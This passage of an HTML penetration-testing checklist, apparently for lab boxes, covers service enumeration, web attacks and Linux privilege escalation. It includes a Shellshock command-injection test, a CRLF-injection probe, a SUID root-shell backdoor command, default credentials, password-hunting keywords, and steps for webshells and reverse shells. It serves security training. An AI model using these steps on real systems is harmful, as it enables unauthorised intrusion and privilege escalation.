              <h4 id="1913-specific-services-strategy">19.1.3 Specific Services Strategy</h4>
              <h5 id="19131-ftp-with-null-session">19.1.3.1 FTP (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="ftp-reset-box"> If it's unstable reset the box</li>
                <li><input type="checkbox" data-id="ftp-banner-grabbing"> Banner Grabbing</li>
                <li><input type="checkbox" data-id="ftp-enumerate"> Enumerate:
                  <ul>
                    <li><input type="checkbox" data-id="ftp-enum-version"> Version</li>
                    <li><input type="checkbox" data-id="ftp-enum-bugs"> Known Service Bugs</li>
                    <li><input type="checkbox" data-id="ftp-enum-config-issues"> Find configuration issues</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-google-fu"> Google-Fu:
                  <ul>
                    <li><input type="checkbox" data-id="ftp-google-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="ftp-google-paths"> Every URL Path</li>
                    <li><input type="checkbox" data-id="ftp-google-params"> Every parameter to find versions, apps, or
                      bugs</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-searchsploit"> Searchsploit every service</li>
                <li><input type="checkbox" data-id="ftp-google-search"> Google
                  <ul>
                    <li><input type="checkbox" data-id="ftp-google-exploitdb"> Every version in exploit db</li>
                    <li><input type="checkbox" data-id="ftp-google-vulns"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="ftp-google-running-services"> Every running service</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-download"> Download
                  <ul>
                    <li><input type="checkbox" data-id="ftp-download-wget"> All files recursively using wget: analyze
                      them
                      <ul>
                        <li><input type="checkbox" data-id="ftp-download-crack"> Crack files with passwords</li>
                        <li><input type="checkbox" data-id="ftp-download-exiftool"> Use <code>exiftool</code> to find
                          possible authors (users)</li>
                        <li><input type="checkbox" data-id="ftp-download-strings"> Use <code>strings</code> to find
                          something interesting in the binaries</li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-upload"> Upload
                  <ul>
                    <li><input type="checkbox" data-id="ftp-upload-binary"> Change to mode <code>binary</code> to upload
                      <code>.exe</code>
                    </li>
                    <li><input type="checkbox" data-id="ftp-upload-location"> Identify where you are in the system:
                      don't
                      know? Google! For example <code>/var/ftp/anon/&lt;directory-name-ifapplies&gt;</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-check-config"> Check configuration files
                  <ul>
                    <li><input type="checkbox" data-id="ftp-config-ftpusers"> <code>ftpusers</code></li>
                    <li><input type="checkbox" data-id="ftp-config-ftpconf"> <code>ftp.conf</code></li>
                    <li><input type="checkbox" data-id="ftp-config-proftpd"> <code>proftpd.conf</code></li>
                    <li><input type="checkbox" data-id="ftp-config-filezilla"> filezilla <code>users.xml</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ftp-dotdotpwn"> Use <a
                    href="https://github.com/wireghoul/dotdotpwn"><code>dotdotpwn</code></a> for potential path
                  traversal
                </li>
              </ul>
              <h5 id="19132-smtp">19.1.3.2 SMTP</h5>
              <ul>
                <li><input type="checkbox" data-id="smtp-nmap-hacktricks"> Use <code>nmap</code> and Hacktricks for
                  guidance.</li>
                <li><input type="checkbox" data-id="smtp-enum-users"> Enumerate users with <code>HYDRA SMTP ENUM</code>.
                </li>
                <li><input type="checkbox" data-id="smtp-google-fu"> Google-Fu:
                  <ul>
                    <li><input type="checkbox" data-id="smtp-google-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="smtp-google-paths"> Every URL Path</li>
                    <li><input type="checkbox" data-id="smtp-google-params"> Every parameter to find versions, apps, or
                      bugs</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="smtp-searchsploit"> Searchsploit every service</li>
                <li><input type="checkbox" data-id="smtp-google-search"> Google
                  <ul>
                    <li><input type="checkbox" data-id="smtp-google-exploitdb"> Every version in exploit db</li>
                    <li><input type="checkbox" data-id="smtp-google-vulns"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="smtp-google-running-services"> Every running service</li>
                  </ul>
                </li>
              </ul>

              <h5 id="19133-dns">19.1.3.3 DNS</h5>
              <ul>
                <li><input type="checkbox" data-id="dns-autorecon-enum"> Use <code>autorecon</code> or manual
                  enumeration.
                </li>
                <li><input type="checkbox" data-id="dns-nslookup-dig"> Perform <code>nslookup</code> and
                  <code>dig axfr</code>.
                </li>
              </ul>

              <h5 id="19134-kerberos">19.1.3.4 Kerberos</h5>
              <ul>
                <li><input type="checkbox" data-id="kerberos-kerbrute-enum"> Enumerate with <code>kerbrute</code>.</li>
                <li><input type="checkbox" data-id="kerberos-kerberoasting"> Attempt Kerberoasting (if possible).</li>
                <li><input type="checkbox" data-id="kerberos-aseroasting"> Try ASEProasting for enumeration.</li>
              </ul>

              <h5 id="19135-pop3">19.1.3.5 POP3</h5>
              <ul>
                <li><input type="checkbox" data-id="pop3-auth-test"> Test authentication as a user</li>
                <li><input type="checkbox" data-id="pop3-list-messages"> List messages (<code>LIST</code> and
                  <code>retr &lt;number&gt;</code> commands).
                </li>
                <li><input type="checkbox" data-id="pop3-google-fu"> Google-Fu:
                  <ul>
                    <li><input type="checkbox" data-id="pop3-google-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="pop3-google-paths"> Every URL Path</li>
                    <li><input type="checkbox" data-id="pop3-google-params"> Every parameter to find versions, apps, or
                      bugs</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="pop3-searchsploit"> Searchsploit every service</li>
                <li><input type="checkbox" data-id="pop3-google-search"> Google
                  <ul>
                    <li><input type="checkbox" data-id="pop3-google-exploitdb"> Every version in exploit db</li>
                    <li><input type="checkbox" data-id="pop3-google-vulns"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="pop3-google-running-services"> Every running service</li>
                  </ul>
                </li>
              </ul>

              <h5 id="19136-rpc-with-null-session">19.1.3.6 RPC (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="rpc-enum-users"> Use <code>enumdomusers</code> to list users: make a
                  list of them.</li>
                <li><input type="checkbox" data-id="rpc-enum-devices"> Use <code>enumprinters</code> to list devices.
                </li>
              </ul>

              <h5 id="19137-smb-with-null-session">19.1.3.7 SMB (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="smb-download-files"> Download all the Files</li>
                <li><input type="checkbox" data-id="smb-mount-shares"> Mount shares</li>
                <li><input type="checkbox" data-id="smb-identify-permissions"> Identify permissions with
                  <code>smbcacls</code>: check if we can upload files
                  <ul>
                    <li><input type="checkbox" data-id="smb-upload-scf"> scf</li>
                    <li><input type="checkbox" data-id="smb-upload-hta"> hta</li>
                    <li><input type="checkbox" data-id="smb-upload-odt"> odt</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="smb-google-fu"> Google-Fu:
                  <ul>
                    <li><input type="checkbox" data-id="smb-google-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="smb-google-paths"> Every URL Path</li>
                    <li><input type="checkbox" data-id="smb-google-params"> Every parameter to find versions, apps, or
                      bugs</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="smb-searchsploit"> Searchsploit every service</li>
                <li><input type="checkbox" data-id="smb-google-search"> Google
                  <ul>
                    <li><input type="checkbox" data-id="smb-google-exploitdb"> Every version in exploit db</li>
                    <li><input type="checkbox" data-id="smb-google-vulns"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="smb-google-running-services"> Every running service</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="smb-ethernalblue"> Check if vulnerable to EthernalBlue</li>
              </ul>
              <h5 id="19138-snmp">19.1.3.8 SNMP</h5>
              <ul>
                <li><input type="checkbox" data-id="snmp-nmap"> Run <code>nmap</code> port scan and banner grabbing</li>
                <li><input type="checkbox" data-id="snmp-snmpwalk"> Use <code>snmpwalk</code>.</li>
                <li><input type="checkbox" data-id="snmp-enumerate"> Enumerate:
                  <ul>
                    <li><input type="checkbox" data-id="snmp-enumerate-version"> Version</li>
                    <li><input type="checkbox" data-id="snmp-enumerate-bugs"> Known Service Bugs</li>
                    <li><input type="checkbox" data-id="snmp-enumerate-config"> Find configuration issues</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="snmp-googlefu"> Google-Fu:
                  <ul>
                    <li><input type="checkbox" data-id="snmp-googlefu-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="snmp-googlefu-paths"> Every URL Path</li>
                    <li><input type="checkbox" data-id="snmp-googlefu-params"> Every parameter to find versions, apps or
                      bugs</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="snmp-searchsploit"> Searchsploit every service</li>
                <li><input type="checkbox" data-id="snmp-google"> Google:
                  <ul>
                    <li><input type="checkbox" data-id="snmp-google-exploitdb"> Every version in exploit db</li>
                    <li><input type="checkbox" data-id="snmp-google-vulnerabilities"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="snmp-google-services"> Every running service</li>
                  </ul>
                </li>
              </ul>
              <h5 id="19139-ldap-with-null-session">19.1.3.9 LDAP (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="ldap-search"> Search with <code>ldapsearch</code> descriptions and
                  fields using keywords like:
                  <ul>
                    <li><input type="checkbox" data-id="ldap-search-unusual"> Unusual fields</li>
                    <li><input type="checkbox" data-id="ldap-search-pwd-lower"> <code>pwd</code></li>
                    <li><input type="checkbox" data-id="ldap-search-pwd-upper"> <code>Pwd</code></li>
                    <li><input type="checkbox" data-id="ldap-search-password"> <code>password</code></li>
                    <li><input type="checkbox" data-id="ldap-search-pass-lower"> <code>pass</code></li>
                    <li><input type="checkbox" data-id="ldap-search-pass-upper"> <code>Pass</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ldap-dump"> <code>ldapdomaindump</code></li>
              </ul>
              <h5 id="191310-redis-with-null-session">19.1.3.10 Redis (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="redis-hacktricks"> Check HackTricks</li>
                <li><input type="checkbox" data-id="redis-enumerate-databases"> Enumerate the databases</li>
                <li><input type="checkbox" data-id="redis-webshell"> Try PHP webshell if we have write access to the
                  <code>/var/www/html/</code> folder
                </li>
                <li><input type="checkbox" data-id="redis-ssh"> Try grabbing SSH keys or uploading them: with the RCE
                  you
                  can check what is the directory</li>
                <li><input type="checkbox" data-id="redis-rce-payloads"> Check all three RCE payloads</li>
                <li><input type="checkbox" data-id="redis-upload-module"> Try uploading <code>module.so</code> if the
                  version is vulnerable.</li>
                <li><input type="checkbox" data-id="redis-reverse-shell"> Try getting directly a reverse shell if found
                  RCE vulnerable</li>
              </ul>
              <h5 id="191311-rsync-with-null-session">19.1.3.11 Rsync (with Null Session)</h5>
              <ul>
                <li><input type="checkbox" data-id="rsync-list-shares"> List shares</li>
                <li><input type="checkbox" data-id="rsync-download-share"> Download Share</li>
                <li><input type="checkbox" data-id="rsync-identify-location"> Identify Where we are</li>
              </ul>
              <h5 id="191312-irc">19.1.3.12 IRC</h5>
              <ul>
                <li><input type="checkbox" data-id="irc-hexchat"> Connect using <code>hexchat</code>.</li>
              </ul>
              <h3 id="192-web">19.2 Web</h3>
              <h4 id="1921-initial-scanning">19.2.1 Initial Scanning</h4>
              <ul>
                <li><input type="checkbox" data-id="web-initial-nmap"> Nmap
                  <ul>
                    <li><input type="checkbox" data-id="web-initial-nmap-auth-owner"> Check for potential auth owner
                    </li>
                    <li><input type="checkbox" data-id="web-initial-nmap-app-types"> Note application types (e.g.,
                      Node.js, Werkzeug, IIS)</li>
                    <li><input type="checkbox" data-id="web-initial-nmap-apache-vuln"> If version is
                      <code>Apache 2.4.49</code>, check for path traversal vulnerability
                    </li>
                  </ul>
                </li>
              </ul>
              <h4 id="1922-vulnerability-scanning">19.2.2 Vulnerability Scanning</h4>
              <ul>
                <li><input type="checkbox" data-id="web-vuln-nikto"> Nikto Scan</li>
                <li><input type="checkbox" data-id="web-vuln-proxy-enum"> Proxy Enumeration (if applicable)
                  <ul>
                    <li><input type="checkbox" data-id="web-vuln-proxy-spose"> Use <a
                        href="https://github.com/emmasolis1/oscp_tools" download target="_blank><code>spose.py</code></a>
                      to enumerate behind the proxy</li>
                  </ul>
                </li>
              </ul>
              <h4 id="1923-site-navigation-and-source-code-inspection">19.2.3 Site Navigation and Source code Inspection
              </h4>
              <ul>
                <li><input type="checkbox" data-id="web-source-inspect"> Inspect Source Code for:
                  <ul>
                    <li><input type="checkbox" data-id="web-source-api"> APIs</li>
                    <li><input type="checkbox" data-id="web-source-href"> <code>href</code> attributes</li>
                    <li><input type="checkbox" data-id="web-source-comments"> Comments</li>
                    <li><input type="checkbox" data-id="web-source-hidden"> Hidden values</li>
                    <li><input type="checkbox" data-id="web-source-odd-code"> Odd or suspicious code</li>
                    <li><input type="checkbox" data-id="web-source-passwords"> Passwords</li>
                    <li><input type="checkbox" data-id="web-source-files"> Downloadable Files (analyze with
                      <code>exiftool</code>)
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="web-html2markdown"> Analyze the website with
                  <code>html2markdown</code>:
                  <code>curl -s http://[ip]/ | html2markdown</code>
                </li>
              </ul>

              <h4 id="1924-user-enumeration-and-credential-gathering">19.2.4 User Enumeration and Credential Gathering
              </h4>
              <ul>
                <li><input type="checkbox" data-id="web-enum-usernames"> Enumerate:
                  <ul>
                    <li><input type="checkbox" data-id="web-enum-usernames-list"> Usernames</li>
                    <li><input type="checkbox" data-id="web-enum-emails"> Emails</li>
                    <li><input type="checkbox" data-id="web-enum-userinfo"> User Info</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="web-userlist-creation"> Create a user list using username-anarchy
                  and
                  other tools:
                  use this against any service or authentication method.
                  <ul>
                    <li><input type="checkbox" data-id="web-passlist-cewl"> Make a passlist out of Cewl:
                      <ul>
                        <li><input type="checkbox" data-id="web-passlist-username"> <code>username:username</code></li>
                        <li><input type="checkbox" data-id="web-passlist-username-password">
                          <code>username:password</code>
                        </li>
                        <li><input type="checkbox" data-id="web-passlist-variations"> Try variations like
                          <code>pass</code>, <code>passwd</code>, <code>pwd</code>, <code>user</code>, <code>usr</code>,
                          <code>secret</code>, <code>cred</code>, <code>credential</code>, <code>auth</code>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </li>
              </ul>

              <h4 id="1925-cms-and-version-detection">19.2.5 CMS and Version Detection</h4>
              <ul>
                <li><input type="checkbox" data-id="web-cms-dns"> Always <strong>add the DNS Address</strong> in the
                  <code>/etc/hosts</code> file.
                </li>
                <li><input type="checkbox" data-id="web-cms-identify"> <strong>Identify CMS or version through</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="web-cms-about"> About pages or visible version numbers</li>
                    <li><input type="checkbox" data-id="web-cms-searchsploit"> Searchsploit for CMS exploits</li>
                    <li><input type="checkbox" data-id="web-cms-service-discovery"> Service discovery for configuration
                      issues</li>
                    <li><input type="checkbox" data-id="web-cms-service-version"> Find service and version</li>
                    <li><input type="checkbox" data-id="web-cms-service-bugs"> Find known service bugs</li>
                    <li><input type="checkbox" data-id="web-cms-config-issues"> Find configuration issues</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="web-phpinfo-path"> For <strong>PHP</strong> check
                  <code>phpinfo</code>
                  for the server&rsquo;s path:
                  <code>$_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]</code>
                </li>
                <li><input type="checkbox" data-id="web-google-fu"> <strong>Google-Fu for Bugs and
                    Vulnerabilities</strong>
                  <ul>
                    <li><input type="checkbox" data-id="web-google-errors"> Every error message</li>
                    <li><input type="checkbox" data-id="web-google-url-paths"> Every URL path</li>
                    <li><input type="checkbox" data-id="web-google-parameters"> Every parameter to find
                      versions/apps/bugs
                    </li>
                    <li><input type="checkbox" data-id="web-google-version-exploitdb"> Every version ExploitDB</li>
                    <li><input type="checkbox" data-id="web-google-version-vuln"> Every version vulnerability</li>
                    <li><input type="checkbox" data-id="web-google-info-check"> Check error messages, URL paths, and
                      parameters for relevant information</li>
                    <li><input type="checkbox" data-id="web-google-searchsploit"> Searchsploit for identified services
                    </li>
                    <li><input type="checkbox" data-id="web-google-known-exploits"> Google known version exploits and
                      vulnerabilities</li>
                  </ul>
                </li>
              </ul>
              <h4 id="1926-technology-specific-checks">19.2.6 Technology-Specific Checks</h4>
              <ul>
                <li><input type="checkbox" data-id="drupal"> <strong>Drupal</strong>
                  <ul>
                    <li><input type="checkbox" data-id="drupal-droopescan"> Use <strong>Droopescan</strong> for
                      enumeration</li>
                    <li><input type="checkbox" data-id="drupal-changelog"> Check <code>changelog.txt</code> for version
                    </li>
                    <li><input type="checkbox" data-id="drupal-endpoint"> Identify <code>endpoint_path</code></li>
                    <li><strong>Drupal Attack Vectors</strong>
                      <ul>
                        <li><input type="checkbox" data-id="drupal-rce"> Drupal 7.x Module Services RCE</li>
                        <li><input type="checkbox" data-id="drupal-drupalgeddon2"> Drupalgeddon2</li>
                        <li><input type="checkbox" data-id="drupal-drupalgeddon3"> DRUPALGEDDON3</li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="jenkins"> <strong>Jenkins</strong>
                  <ul>
                    <li><input type="checkbox" data-id="jenkins-default-credentials"> Check for Default Credentials, if
                      that does not work
                      <ul>
                        <li><input type="checkbox" data-id="jenkins-create-user"> Create a new user</li>
                        <li><input type="checkbox" data-id="jenkins-ad-auth"> Consider if there is an AD auth behind, in
                          that case try <code>kerbrute</code>, and then <code>kerberoasting</code> or
                          <code>asproasting</code>.
                        </li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="jenkins-version-exploits"> Identify version and associated
                      exploits</li>
                    <li><input type="checkbox" data-id="jenkins-groovy"> Utilize Groovy Script for reverse shell</li>
                    <li><input type="checkbox" data-id="jenkins-create-job"> Create a new job:
                      <ul>
                        <li><input type="checkbox" data-id="jenkins-buildable"> If buildable, execute commands, if not
                          then use curl or cronjob for execution</li>
                        <li><input type="checkbox" data-id="jenkins-reverse-shell"> Attempt to get a reverse shell</li>
                        <li><input type="checkbox" data-id="jenkins-decryption-files"> Hunt for <code>master.key</code>
                          and other decryption files if necessary</li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="phpmyadmin"> <strong>phpMyAdmin</strong>
                  <ul>
                    <li><input type="checkbox" data-id="phpmyadmin-default-creds"> Try default credentials (just a few
                      examples but there are more default creds):
                      <ul>
                        <li><input type="checkbox" data-id="phpmyadmin-root"> <code>root:</code></li>
                        <li><input type="checkbox" data-id="phpmyadmin-root-password"> <code>root:password</code></li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="phpmyadmin-upload-shell"> Once authenticated, upload a shell via
                      SQL query</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="tomcat"> <strong>Tomcat</strong>
                  <ul>
                    <li><input type="checkbox" data-id="tomcat-nikto"> Conduct a Nikto scan</li>
                    <li><input type="checkbox" data-id="tomcat-version-vulns"> Search for vulnerabilities based on
                      version
                      number
                      <ul>
                        <li><input type="checkbox" data-id="tomcat-manager"> Look for <code>/manager</code></li>
                        <li><input type="checkbox" data-id="tomcat-default-creds"> Use a default credential list
                          <ul>
                            <li><input type="checkbox" data-id="tomcat-upload-war"> If got access, upload WAR file for
                              reverse shell access</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="webdav"> <strong>WebDav</strong>
                  <ul>
                    <li><input type="checkbox" data-id="webdav-default-creds"> Check for default credentials</li>
                    <li><input type="checkbox" data-id="webdav-spray"> Spray for other credentials</li>
                    <li><input type="checkbox" data-id="webdav-cadaver"> Use <strong>cadaver</strong> for file uploads
                      (e.g., ASPX files)</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="wordpress"> <strong>WordPress</strong>
                  <ul>
                    <li><input type="checkbox" data-id="wordpress-wpscan-plugins"> Run <strong>wpscan</strong> for
                      vulnerable plugins</li>
                    <li><input type="checkbox" data-id="wordpress-wpscan-bruteforce"> Use wpscan for brute-forcing</li>
                  </ul>
                </li>
              </ul>
              <h4 id="1927-enumerate-upload-capabilities">19.2.7 Enumerate Upload Capabilities</h4>
              <ul>
                <li><input type="checkbox" data-id="upload-allowed-extensions"> Identify allowed file extensions for
                  uploads</li>
                <li><input type="checkbox" data-id="upload-pair-with-other"> Pair with FTP, Redis, and other upload
                  capabilities</li>
              </ul>
              <hr>
              <p><strong>AT THIS STAGE, IT'S CRUCIAL TO CONSIDER THE VERSION AND TECHNOLOGY OF THE APPLICATION. IF NO
                  IDENTIFIABLE EXPLOIT EXISTS, IT LIKELY INDICATES THAT THE WEBSITE WAS CREATED BY THE BOX'S AUTHORS. BE
                  AWARE OF POTENTIAL SQL INJECTION AND CODE INJECTION VULNERABILITIES, AND ENSURE YOUR PAYLOADS ALIGN
                  WITH
                  THE WEBSITE'S TECHNOLOGY.</strong></p>
              <hr>

              <h4 id="1928-application-logic-and-security-analysis">19.2.8 Application Logic and Security Analysis</h4>
              <ul>
                <li><input type="checkbox" data-id="logic-apply-reasoning"> Apply logical reasoning:
                  <ul>
                    <li><input type="checkbox" data-id="logic-assess-malicious"> Assess the application from a malicious
                      perspective: What is valuable? What can be exploited?</li>
                    <li><input type="checkbox" data-id="logic-examine-business"> Examine business logic: How is the
                      application intended to function?</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="401-403-check"> 401 OR 403?
                  <ul>
                    <li><input type="checkbox" data-id="401-403-bypass"> Attempt to bypass</li>
                    <li><input type="checkbox" data-id="401-403-hacktricks"> Use HackTricks; a script may be available
                      to
                      assist.</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="404-check"> 404? Try these sites to see if the message changes:
                  <ul>
                    <li><input type="checkbox" data-id="404-php"><code>DoNotExist.php</code></li>
                    <li><input type="checkbox" data-id="404-html"><code>DoNotExist.html</code></li>
                    <li><input type="checkbox" data-id="404-generic"><code>DoNotExist</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="nikto-results"><strong>Nikto Results</strong>?
                  <ul>
                    <li><input type="checkbox" data-id="nikto-google"> Google everything that Nikto returns; e.g.,
                      exploitable APIs discovered.</li>
                  </ul>
                </li>
              </ul>

              <h4 id="1929-directory-and-file-enumeration">19.2.9 Directory and File Enumeration</h4>
              <ul>
                <li><input type="checkbox" data-id="enum-directories"> Enumerate <strong>directories</strong>
                  <ul>
                    <li><input type="checkbox" data-id="dirsearch"> Use <strong>dirsearch</strong></li>
                    <li><input type="checkbox" data-id="gobuster"> Use <strong>gobuster</strong></li>
                    <li><input type="checkbox" data-id="paths-boxname"> Use paths <code>/[boxName]</code></li>
                    <li><input type="checkbox" data-id="cgi-bin-folder"> If a <code>/cgi-bin/</code> folder is found:
                      <ul>
                        <li><input type="checkbox" data-id="shellshock-test"> Perform a Shellshock test:
                          <code>nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]</code>
                        </li>
                        <li><input type="checkbox" data-id="cgi-bin-dirb"> <code>/cgi-bin/</code> Dirb scan</li>
                        <li><input type="checkbox" data-id="dirb-normal"> Dirb normal scan</li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="initial-enum-rerun"> Rerun initial enum for this such as source code
                  inspection</li>
                <li><input type="checkbox" data-id="hidden-params"> Enumerate <strong>hidden parameters</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="wfuzz"><code>wfuzz</code></li>
                    <li><input type="checkbox" data-id="ffuf"><code>ffuf</code></li>
                    <li><input type="checkbox" data-id="guess-params"> Guess parameters; for example, if there's a POST
                      <code>forgot_pass.php</code> with an email param, try
                      <code>GET /forgot_pass.php?email=%0aid</code>
                      and vice versa.
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="rfi-lfi"> Enumerate parameters for <strong>RFI and LFI</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="relative-path"> Utilize relative path techniques to expose other
                      services.</li>
                    <li><input type="checkbox" data-id="check-rce"> Check for RCE methods extensively.</li>
                    <li><input type="checkbox" data-id="dotdotpwn"><a href="https://github.com/wireghoul/dotdotpwn"
                        title="https://github.com/wireghoul/dotdotpwn">https://github.com/wireghoul/dotdotpwn</a></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="config-files"> Check if there is anything important in
                  <strong>configuration files</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="robots-txt"><code>robots.txt</code></li>
                    <li><input type="checkbox" data-id="svn"><code>.svn</code></li>
                    <li><input type="checkbox" data-id="ds-store"><code>.DS_STORE</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="ssrf"> Check for <strong>SSRF</strong> if any browser-like features
                  exist:
                  <ul>
                    <li><input type="checkbox" data-id="capture-hashes"> Capture hashes via Responder, for later use of
                      cracking.</li>
                  </ul>
                </li>
              </ul>

              <h4 id="19210-parameter-testing-and-sql-injection">19.2.10 Parameter Testing and SQL Injection</h4>
              <ul>
                <li><input type="checkbox" data-id="post-get-requests"><strong>Play with POST and GET</strong> requests,
                  which could reveal something:
                  <ul>
                    <li><input type="checkbox" data-id="google-everything"> Google everything</li>
                    <li><input type="checkbox" data-id="guess-post-params"> Guess post parameters based on output, check
                      for example the <a
                        href="https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/hetemit/50000">werkzeug
                        section of the blog</a>.</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="weak-cookies"> Play with <strong>weak cookies</strong> and
                  parameters:
                  look for weak encryption, maybe decrypt into passwords and modify to admin.</li>
                <li><input type="checkbox" data-id="sql-injection"> Every parameter/input should be tested for
                  <strong>SQL
                    Injection</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="shells-db"> Try enabling shells depending on the database.</li>
                    <li><input type="checkbox" data-id="enumerate-db"> Attempt to enumerate tables and other database
                      elements if shells are not feasible.</li>
                  </ul>
                </li>
              </ul>

              <h4 id="19211-authentication-and-login-forms">19.2.11 Authentication and Login Forms</h4>
              <ul>
                <li><input type="checkbox" data-id="default-creds"> Check for default credentials: Google for defaults,
                  or
                  <code>creds</code> tool from Kali (<code>pip3 install defaultcreds-cheat-sheet</code>)
                </li>
                <li><input type="checkbox" data-id="cewl"> Use <code>cewl</code> to create user and pass lists</li>
                <li><input type="checkbox" data-id="common-combos"> Attempt combinations like:
                  <ul>
                    <li><input type="checkbox" data-id="version-version"><code>version:version</code></li>
                    <li><input type="checkbox" data-id="boxname-boxname"><code>boxname:boxname</code></li>
                    <li><input type="checkbox" data-id="admin-version"><code>admin:version</code></li>
                    <li><input type="checkbox" data-id="name-version"><code>name:version</code></li>
                    <li><input type="checkbox" data-id="php-type-juggling"> Experiment with PHP type juggling</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="cred-elsewhere"> Consider that <strong>credentials may be located
                    elsewhere within the box</strong>.</li>
                <li><input type="checkbox" data-id="perform-brute-force"> Perform <strong>brute-force attacks if
                    neccesary</strong></li>
              </ul>

              <h3 id="193-privilege-escalation">19.3 Privilege Escalation</h3>
              <h4 id="1931-linux">19.3.1 Linux</h4>
              <h5 id="19311-principles-to-becoming-root">19.3.1.1 Principles to Becoming Root</h5>
              <ol>
                <li>Adding a new user.</li>
                <li>Make the user run commands without needing password <code>sudo -l</code></li>
                <li><code>cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash</code></li>
              </ol>
              <h5 id="19312-general-enumeration">19.3.1.2 General Enumeration</h5>
              <ul>
                <li><input type="checkbox" data-id="upgrade-shell"> Upgrade your shell using Socat, else Python</li>
                <li><input type="checkbox" data-id="docker-check"> Are we in a docker container? If so this can be seen
                  by
                  doing an <code>ls -la</code>. See how to escape from the notes</li>
                <li><input type="checkbox" data-id="sudo-killer"> Run SUDO Killer if we have full SSH creds</li>
                <li><input type="checkbox" data-id="sui3emum"> Run SUI3Emum</li>
                <li><input type="checkbox" data-id="test-default-cred-root"> Test the default credential to elevate
                  privileges <code>root:root</code></li>
                <li><input type="checkbox" data-id="run-linpeas"> Run <code>linpeas.sh</code>
                  <ul>
                    <li><input type="checkbox" data-id="pwnkit-check"> <code>PwnKit</code>? This is an easy win</li>
                    <li><input type="checkbox" data-id="enumerate-users"> Enumerate <strong>Users</strong>
                      <ul>
                        <li><input type="checkbox" data-id="check-other-users"> Look for other users</li>
                        <li><input type="checkbox" data-id="try-switch-users"> Try to switch users and rerun
                          enumeration:
                          test different words other than PASSWORD, e.g.,
                          <code>pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret</code>
                        </li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="enumerate-groups"> Enumerate <strong>Groups</strong>
                      <ul>
                        <li><input type="checkbox" data-id="check-exploitable-groups"> Are these exploitable?</li>
                        <li><input type="checkbox" data-id="group-lxd"> lxd</li>
                        <li><input type="checkbox" data-id="group-davfs"> davfs</li>
                        <li><input type="checkbox" data-id="group-sudo"> sudo</li>
                        <li><input type="checkbox" data-id="group-fail2ban"> fail2ban - Any accessible sensitive file?
                        </li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="enumerate-file-system"> Enumerate the file system and see if there
                  are
                  weird files that we can overwrite
                  <ul>
                    <li><input type="checkbox" data-id="check-opt-srv"> Check <code>/opt</code> and <code>/srv</code>,
                      expecting to find both empty</li>
                    <li><input type="checkbox" data-id="find-py-files"> You could also try:
                      <code>find / -name "*.py"</code>
                    </li>
                    <li><input type="checkbox" data-id="check-weird-folders"> Check for weird folders and see if there
                      are
                      any bash scripts that we could also modify</li>
                    <li><input type="checkbox" data-id="python-scripts"> Python scripts</li>
                    <li><input type="checkbox" data-id="perl-check"> Even check Perl</li>
                  </ul>
                </li>
